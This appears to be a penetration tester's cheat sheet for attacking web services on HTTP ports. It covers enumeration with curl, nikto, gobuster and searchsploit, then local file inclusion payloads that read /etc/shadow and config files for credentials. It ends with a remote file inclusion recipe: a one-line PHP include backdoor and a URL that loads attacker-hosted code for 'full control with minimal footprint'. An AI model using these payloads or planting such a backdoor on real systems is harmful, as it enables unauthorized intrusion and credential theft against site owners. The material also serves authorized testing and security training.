### HTTP - 80, 8080, 8000

```
curl -i ${IP}/robots.txt
```

Note down Server and other module versions.

searchsploit them ALL.

Visit all URLs from robots.txt.

```
nikto -host $IP
```

```
gobuster -u http://$IP -w /usr/share/seclists/Discovery/Web_Content/Top1000-RobotsDisallowed.txt

gobuster -u http://$IP -w /usr/share/seclists/Discovery/Web_Content/common.txt
```

if nothing, find more web word lists.

*Browse the site* but keep an eye on the burp window / source code / cookies etc.

Things to be on look for:

- Default credentials for software
- SQL-injectable GET/POST params
- LFI/RFI through ?page=foo type params
- LFI:
  - `/etc/passwd` | `/etc/shadow` insta-win
  - `/var/www/html/config.php` or similar paths to get SQL etc creds
  - `?page=php://filter/convert.base64-encode/resource=../config.php`
  - `../../../../../boot.ini` to find out windows version
- RFI:
  - Have your PHP/cgi downloader ready
  - `<?php include $_GET['inc']; ?>` simplest backdoor to keep it dynamic without anything messing your output
  - Then you can just `http://$IP/inc.php?inc=http://$YOURIP/bg.php` and have full control with minimal footprint on target machine
  - get `phpinfo()`
